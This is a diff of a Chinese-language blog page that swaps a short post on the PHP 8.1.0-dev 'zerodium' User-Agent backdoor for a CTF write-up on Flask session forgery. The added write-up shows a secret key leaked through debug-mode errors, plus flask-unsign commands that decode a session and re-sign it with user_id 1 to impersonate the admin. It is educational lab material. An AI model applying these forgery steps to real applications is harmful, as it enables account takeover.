@@ -20,24 +20,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="感谢susen师傅，我弥补了一些不足与知识盲区">
+  <meta name="description" content="两题忙两天，一题半小时，一题一天零24小时（犯蠢找到错的密钥）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Php-8.1.0-dev后门执行">
-<meta property="og:url" content="http://example.com/2025/04/24/Php-8-1-0-dev%E5%90%8E%E9%97%A8%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="基于flask的session伪造">
+<meta property="og:url" content="http://example.com/2025/05/15/%E5%9F%BA%E4%BA%8Eflask%E7%9A%84session%E4%BC%AA%E9%80%A0/index.html">
 <meta property="og:site_name" content="3a0-Eminem">
-<meta property="og:description" content="感谢susen师傅，我弥补了一些不足与知识盲区">
+<meta property="og:description" content="两题忙两天，一题半小时，一题一天零24小时（犯蠢找到错的密钥）">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/image/1-1.png">
-<meta property="og:image" content="http://example.com/image/1-2.png">
-<meta property="article:published_time" content="2025-04-24T15:58:24.000Z">
-<meta property="article:modified_time" content="2025-05-12T03:40:29.506Z">
+<meta property="article:published_time" content="2025-05-15T01:49:18.000Z">
+<meta property="article:modified_time" content="2025-05-15T02:48:41.727Z">
 <meta property="article:author" content="3a0-Eminem">
-<meta property="article:tag" content="PHP">
-<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/image/1-1.png">
 
-<link rel="canonical" href="http://example.com/2025/04/24/Php-8-1-0-dev%E5%90%8E%E9%97%A8%E6%89%A7%E8%A1%8C/">
+<link rel="canonical" href="http://example.com/2025/05/15/%E5%9F%BA%E4%BA%8Eflask%E7%9A%84session%E4%BC%AA%E9%80%A0/">
 
 
 <script id="page-configurations">
@@ -50,7 +45,7 @@
   };
 </script>
 
-  <title>Php-8.1.0-dev后门执行 | 3a0-Eminem</title>
+  <title>基于flask的session伪造 | 3a0-Eminem</title>
   
 
 
@@ -175,7 +170,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/24/Php-8-1-0-dev%E5%90%8E%E9%97%A8%E6%89%A7%E8%A1%8C/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/15/%E5%9F%BA%E4%BA%8Eflask%E7%9A%84session%E4%BC%AA%E9%80%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -188,7 +183,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Php-8.1.0-dev后门执行
+          基于flask的session伪造
         </h1>
 
         <div class="post-meta">
@@ -197,19 +192,13 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2025-04-24 23:58:24" itemprop="dateCreated datePublished" datetime="2025-04-24T23:58:24+08:00">2025-04-24</time>
+              <time title="创建时间：2025-05-15 09:49:18 / 修改时间：10:48:41" itemprop="dateCreated datePublished" datetime="2025-05-15T09:49:18+08:00">2025-05-15</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-12 11:40:29" itemprop="dateModified" datetime="2025-05-12T11:40:29+08:00">2025-05-12</time>
-              </span>
 
           
-            <div class="post-description">感谢susen师傅，我弥补了一些不足与知识盲区</div>
+            <div class="post-description">两题忙两天，一题半小时，一题一天零24小时（犯蠢找到错的密钥）</div>
 
         </div>
       </header>
@@ -220,7 +209,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="感谢队友susen师傅的博客，让我知道了还有这种类型的类模板注入，这里是使用关键字进行模板注入，很有意思，来搞来搞，当作知识补充，"><a href="#感谢队友susen师傅的博客，让我知道了还有这种类型的类模板注入，这里是使用关键字进行模板注入，很有意思，来搞来搞，当作知识补充，" class="headerlink" title="感谢队友susen师傅的博客，让我知道了还有这种类型的类模板注入，这里是使用关键字进行模板注入，很有意思，来搞来搞，当作知识补充，"></a>感谢队友susen师傅的博客，让我知道了还有这种类型的类模板注入，这里是使用关键字进行模板注入，很有意思，来搞来搞，当作知识补充，</h2><h3 id="User-Agent处存在SSTI，但是需要关键字段来执行我们所需要执行的php命令，而关键字段就是zerodium，再用很常规的ssti模板来搞，就很方便了，接下来上实操"><a href="#User-Agent处存在SSTI，但是需要关键字段来执行我们所需要执行的php命令，而关键字段就是zerodium，再用很常规的ssti模板来搞，就很方便了，接下来上实操" class="headerlink" title="User-Agent处存在SSTI，但是需要关键字段来执行我们所需要执行的php命令，而关键字段就是zerodium，再用很常规的ssti模板来搞，就很方便了，接下来上实操"></a>User-Agent处存在SSTI，但是需要关键字段来执行我们所需要执行的php命令，而关键字段就是zerodium，再用很常规的ssti模板来搞，就很方便了，接下来上实操</h3><h3 id="先打一个POC验证后门执行"><a href="#先打一个POC验证后门执行" class="headerlink" title="先打一个POC验证后门执行"></a>先打一个POC验证后门执行</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/image/1-1.png" alt="111"></h3><h3 id="后再直接cat，tac都可以，什么内联执行，什么什么的，爱用哪个用哪个，反正只要能干出来的就是好东西结束"><a href="#后再直接cat，tac都可以，什么内联执行，什么什么的，爱用哪个用哪个，反正只要能干出来的就是好东西结束" class="headerlink" title="后再直接cat，tac都可以，什么内联执行，什么什么的，爱用哪个用哪个，反正只要能干出来的就是好东西结束"></a>后再直接cat，tac都可以，什么内联执行，什么什么的，爱用哪个用哪个，反正只要能干出来的就是好东西<img src="/image/1-2.png" alt="222">结束</h3><h4 id="感谢两位队友，我绝对不拖他们的后腿–susen和cyzrjz"><a href="#感谢两位队友，我绝对不拖他们的后腿–susen和cyzrjz" class="headerlink" title="感谢两位队友，我绝对不拖他们的后腿–susen和cyzrjz"></a>感谢两位队友，我绝对不拖他们的后腿–susen和cyzrjz</h4>
+        <h3 id="NSSRound-13-Basic-flask-jwt-hard"><a href="#NSSRound-13-Basic-flask-jwt-hard" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?(hard)"></a>[NSSRound#13 Basic]flask?jwt?(hard)</h3><p>先讲难的那个，就是我搞了很久的那题<br>找拉蒙特徐，我说我明明找到了密钥，但是伪造的session还是通过不了，拉蒙特徐说:flask伪造session主要还是依靠密钥，只要有密钥就什么都不会错<br>他建议我去本地起一个flask用于调试密钥是否正确（这个我后续会去讲）<br>后面我发现真的是密钥错了（笑死了）</p>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>我本来想去搞几题flask框架来打打，然后发现不是ssti就是什么杂七杂八的，我就选了两题cookie伪造来做，后面就认识到了这些内容</p>
+<h4 id="查找密钥"><a href="#查找密钥" class="headerlink" title="查找密钥"></a>查找密钥</h4><p>由于拉蒙特徐让我去起flask，因此我学到了一些flask相关的知识，这题中用到的是flask的debug模式的知识<br>当flask开启debug（debug&#x3D;True），我输入不当内容页面会报错，这题的密钥就是通过报错找到的，现在&#x2F;wor目录下找到提示（一个时间），然后burp打一个错误的session进去，出现报错界面，我在这个界面中找了一个错误的密钥，因此一直做不出来，但是现在不要紧，因为我在这个界面中找到正确的密钥了<br>只要找到正确的密钥，然后用flask-unsign加密即可</p>
+<h4 id="核心出装–flask-unsign"><a href="#核心出装–flask-unsign" class="headerlink" title="核心出装–flask-unsign"></a>核心出装–flask-unsign</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -d -c <span class="string">&quot;.eJwljjGOAjEMRa8SuaawnTjO5AJbTUeP4mALim0GpkCIuzOrLd8v3n9vuMTmjxv057b7CS73K3RowSZLw1aplKFaWIqTGUUdmaYYGucyK2WipcXIWSwzorssFvVKhmNEZWYnNRNEQY_IKl69hBzeisfHQtMoTylN1XhOdm1StcERsj98-6_hA5_3X4f-hvQ3nG_7KZGkdbwSI0tC6qydWvpZz_D5fAGY0zl7.aCVC9g.7om0is_7m3lMe1lIrBmBVbRawGI&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;_fresh&#x27;</span>: True, <span class="string">&#x27;_id&#x27;</span>: <span class="string">&#x27;8f2b598086144a774254e1bb1f6a31c5b0b234c6131198fa335b3200ee59bf6d1b0aaf6222e17bb50050eff375e6e4f586160f2b91cb13c54877b2cc2e785678&#x27;</span>, <span class="string">&#x27;_user_id&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;time&#x27;</span>: datetime.datetime(2025, 5, 15, 1, 27, 18, tzinfo=datetime.timezone.utc)&#125;</span><br></pre></td></tr></table></figure>
+<p>得到的json结构就是解出来的cookie，结合我们之前找到的flask的密钥，再进行加密,把得到的新的session交上去，就可以得到flag了<br>把_user_id改成1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s -S hardgam3_C0u1d_u_f1ndM3???? -c <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;8f2b598086144a774254e1bb1f6a31c5b0b234c6131198fa335b3200ee59bf6d1b0aaf6222e17bb50050eff375e6e4f586160f2b91cb13c54877b2cc2e785678&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;, &#x27;time&#x27;: &#x27;datetime.datetime(2025, 5, 15, 1, 27, 18, tzinfo=datetime.timezone.utc)&#x27;&#125;&quot;</span></span><br><span class="line">.eJw9jk2KwzAMha8SvOpAKJJs2U6hZymWI9Es2kLqbFp693EYpqCf7y309N7uYqs-r-7U1k1Hd1lmd3LZSHjKkCOGUFIKxEFRBC0Wj5UFhHyoET3ilK14z-IJQJUnsTijQCkWiUgxiTAAg5r5xBo1GHffCP3HhFXQVw45JaFaSVPmmLLrQbanrn9psMu23LTjXJruePyHAwHxOPTCvceBUl95HNprudvj_D3Yx-tx1-PW6o_7_AKv1Ucd.aCVEOA.2DvC6wOeRNJO073nKbfeXNWUsGA</span><br></pre></td></tr></table></figure>
+<p>这里注意一点，我们解出来的time的值是没有用单引号包裹的，但是我们重新加密时是用单引号包裹的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一处解密出来：<span class="string">&#x27;time&#x27;</span>: datetime.datetime(2025, 5, 15, 1, 27, 18, tzinfo=datetime.timezone.utc)</span><br><span class="line">第二处加密出来：<span class="string">&#x27;time&#x27;</span>: <span class="string">&#x27;datetime.datetime(2025, 5, 15, 1, 27, 18, tzinfo=datetime.timezone.utc)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>理由是：当你用 flask-unsign -s 的 -c 参数来“伪造”一个 session dict 时，命令内部实际上是用 Python 的 ast.literal_eval（或者等价的安全字面量解析器）来把你传进来的字符串转换成一个 Python 对象。ast.literal_eval 只接受真正的字面量（字符串、数字、布尔值、列表、字典、元组等），不接受诸如函数调用或名称引用（比如 datetime.datetime(…)）——那会被当成不安全的表达式直接拒绝<br>如果写上者，就会有<br>ast.literal_eval 会报错，因为它不认识 datetime 这个名字，也不能执行函数调用。<br>如果写下者，就会有<br>literal_eval 就能把它解析成一个 Python 字符串 “datetime.datetime(…)” 而不是要你去调用 datetime.datetime。<br>总结一下：<br>加引号只是为了满足 flask-unsign（背后用的 ast.literal_eval）对“只允许字面量”的限制，否则它既不能识别也不会执行你那串 datetime.datetime(…)</p>
+<p>网上关于这个的wp还是太少了<br>想了一想，第一题还是不写wp了，太麻烦</p>
+<h4 id="后语"><a href="#后语" class="headerlink" title="后语"></a>后语</h4><p>认识到了挺多flask的内容(路由什么的都会了)，也学会了本地起一个简单的flask服务，这里我相当感谢拉蒙特徐了</p>
+
     </div>
 
     
@@ -228,21 +228,17 @@
     
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/PHP/" rel="tag"># PHP</a>
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
-          </div>
 
         
 
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2025/04/25/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A5%E9%97%A8-%E7%BC%96%E7%A0%81%E5%AD%A6%E4%BB%A5%E5%8F%8ARSA%E5%9F%BA%E7%A1%80/" rel="next" title="密码学入门-编码学以及RSA基础">
-      密码学入门-编码学以及RSA基础 <i class="fa fa-chevron-right"></i>
+    <a href="/2025/05/12/%E8%AE%B0%E4%B8%80%E6%AC%A1python%E5%A4%A7%E4%BD%9C%E4%B8%9A/" rel="prev" title="记一次python大作业">
+      <i class="fa fa-chevron-left"></i> 记一次python大作业
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -301,7 +297,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%84%9F%E8%B0%A2%E9%98%9F%E5%8F%8Bsusen%E5%B8%88%E5%82%85%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%8C%E8%AE%A9%E6%88%91%E7%9F%A5%E9%81%93%E4%BA%86%E8%BF%98%E6%9C%89%E8%BF%99%E7%A7%8D%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%B1%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%8C%E8%BF%99%E9%87%8C%E6%98%AF%E4%BD%BF%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%9B%E8%A1%8C%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%EF%BC%8C%E6%9D%A5%E6%90%9E%E6%9D%A5%E6%90%9E%EF%BC%8C%E5%BD%93%E4%BD%9C%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85%EF%BC%8C"><span class="nav-number">1.</span> <span class="nav-text">感谢队友susen师傅的博客，让我知道了还有这种类型的类模板注入，这里是使用关键字进行模板注入，很有意思，来搞来搞，当作知识补充，</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Agent%E5%A4%84%E5%AD%98%E5%9C%A8SSTI%EF%BC%8C%E4%BD%86%E6%98%AF%E9%9C%80%E8%A6%81%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5%E6%9D%A5%E6%89%A7%E8%A1%8C%E6%88%91%E4%BB%AC%E6%89%80%E9%9C%80%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84php%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%80%8C%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5%E5%B0%B1%E6%98%AFzerodium%EF%BC%8C%E5%86%8D%E7%94%A8%E5%BE%88%E5%B8%B8%E8%A7%84%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%9D%A5%E6%90%9E%EF%BC%8C%E5%B0%B1%E5%BE%88%E6%96%B9%E4%BE%BF%E4%BA%86%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E4%B8%8A%E5%AE%9E%E6%93%8D"><span class="nav-number">1.1.</span> <span class="nav-text">User-Agent处存在SSTI，但是需要关键字段来执行我们所需要执行的php命令，而关键字段就是zerodium，再用很常规的ssti模板来搞，就很方便了，接下来上实操</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%88%E6%89%93%E4%B8%80%E4%B8%AAPOC%E9%AA%8C%E8%AF%81%E5%90%8E%E9%97%A8%E6%89%A7%E8%A1%8C"><span class="nav-number">1.2.</span> <span class="nav-text">先打一个POC验证后门执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%86%8D%E7%9B%B4%E6%8E%A5cat%EF%BC%8Ctac%E9%83%BD%E5%8F%AF%E4%BB%A5%EF%BC%8C%E4%BB%80%E4%B9%88%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%EF%BC%8C%E4%BB%80%E4%B9%88%E4%BB%80%E4%B9%88%E7%9A%84%EF%BC%8C%E7%88%B1%E7%94%A8%E5%93%AA%E4%B8%AA%E7%94%A8%E5%93%AA%E4%B8%AA%EF%BC%8C%E5%8F%8D%E6%AD%A3%E5%8F%AA%E8%A6%81%E8%83%BD%E5%B9%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%B0%B1%E6%98%AF%E5%A5%BD%E4%B8%9C%E8%A5%BF%E7%BB%93%E6%9D%9F"><span class="nav-number">1.4.</span> <span class="nav-text">后再直接cat，tac都可以，什么内联执行，什么什么的，爱用哪个用哪个，反正只要能干出来的就是好东西结束</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%84%9F%E8%B0%A2%E4%B8%A4%E4%BD%8D%E9%98%9F%E5%8F%8B%EF%BC%8C%E6%88%91%E7%BB%9D%E5%AF%B9%E4%B8%8D%E6%8B%96%E4%BB%96%E4%BB%AC%E7%9A%84%E5%90%8E%E8%85%BF%E2%80%93susen%E5%92%8Ccyzrjz"><span class="nav-number">1.4.1.</span> <span class="nav-text">感谢两位队友，我绝对不拖他们的后腿–susen和cyzrjz</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#NSSRound-13-Basic-flask-jwt-hard"><span class="nav-number">1.</span> <span class="nav-text">[NSSRound#13 Basic]flask?jwt?(hard)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%AF%86%E9%92%A5"><span class="nav-number">1.2.</span> <span class="nav-text">查找密钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%87%BA%E8%A3%85%E2%80%93flask-unsign"><span class="nav-number">1.3.</span> <span class="nav-text">核心出装–flask-unsign</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E8%AF%AD"><span class="nav-number">1.4.</span> <span class="nav-text">后语</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
